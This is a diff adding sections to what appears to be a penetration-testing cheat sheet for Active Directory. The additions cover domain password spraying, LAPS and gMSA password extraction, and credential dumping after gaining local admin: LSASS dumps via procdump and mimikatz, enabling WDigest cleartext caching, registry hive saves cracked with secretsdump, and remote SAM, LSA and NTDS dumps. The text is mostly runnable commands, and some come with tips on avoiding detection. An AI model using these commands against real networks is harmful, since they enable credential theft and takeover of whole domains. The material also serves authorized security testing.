@@ -190,11 +190,29 @@ crackmapexec smb <dc_ip> -u users.txt -p 'Password2024!' --continue-on-success
 # kerbrute spray (Kerberos — lower noise than SMB)
 kerbrute passwordspray -d domain.local --dc <dc_ip> users.txt 'Password2024!'
 
+# DomainPasswordSpray.ps1 (from domain-joined Windows — auto-enumerates users)
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password 'Welcome1' -OutFile spray_success -ErrorAction SilentlyContinue
+
 # trevorspray — LDAP spray (staggered, lockout-aware)
 trevorspray -u users.txt -p 'Password2024!' --host <dc_ip> --lockout-threshold 3
 ```
 
 See `offensive-tools/windows/kerbrute/`, `offensive-tools/windows/trevorspray/`.
+
+### LAPS & gMSA password extraction
+
+```bash
+# LAPS — read local admin passwords from AD (requires ReadLAPSPassword rights)
+nxc ldap <dc_ip> -u user -p pass -M laps
+nxc smb <subnet>/24 -u user -p pass --laps    # authenticate using LAPS passwords
+
+# gMSA — read managed service account passwords (requires ReadGMSAPassword)
+nxc ldap <dc_ip> -u user -p pass -M gmsa
+python3 gMSADumper.py -u user -p pass -d domain.local -l <dc_ip>
+```
+
+→ Full LAPS/gMSA extraction patterns: `references/ad-enumeration.md`.
 
 → Full attack patterns, ticket abuse, delegation exploits: `references/kerberos-attacks.md`.
 
@@ -402,6 +420,40 @@ MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:S
 See `offensive-tools/windows/crackmapexec/`, `offensive-tools/windows/evil-winrm/`, `offensive-tools/windows/impacket/`.
 
 → Full lateral movement patterns: `references/lateral-movement-ad.md`.
+
+### Credential extraction (post local-admin)
+
+Once local admin on a host, dump credentials to pivot further.
+
+```bash
+# LSASS dump via procdump (SysInternals — less suspicious than mimikatz on disk)
+procdump64.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp
+# Parse offline with mimikatz
+.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
+
+# Mimikatz live (requires SeDebugPrivilege)
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# Credential Manager stored creds
+.\mimikatz.exe "privilege::debug" "sekurlsa::credman" "exit"
+# or: vault::cred
+
+# Enable WDigest cleartext caching (requires reboot or new logon)
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+# After next logon, sekurlsa::logonpasswords will show cleartext passwords
+
+# Registry SAM/SYSTEM/SECURITY dump (offline cracking — avoids touching LSASS)
+reg.exe save hklm\sam C:\Windows\Temp\sam.save
+reg.exe save hklm\system C:\Windows\Temp\system.save
+reg.exe save hklm\security C:\Windows\Temp\security.save
+# Crack offline:
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
+
+# CrackMapExec — remote credential dump (SAM, LSA, NTDS)
+crackmapexec smb <target> -u admin -p pass --sam       # local SAM hashes
+crackmapexec smb <target> -u admin -p pass --lsa       # LSA secrets
+crackmapexec smb <dc_ip> -u admin -p pass --ntds       # NTDS.dit (DA required)
+```
 
 ---
 
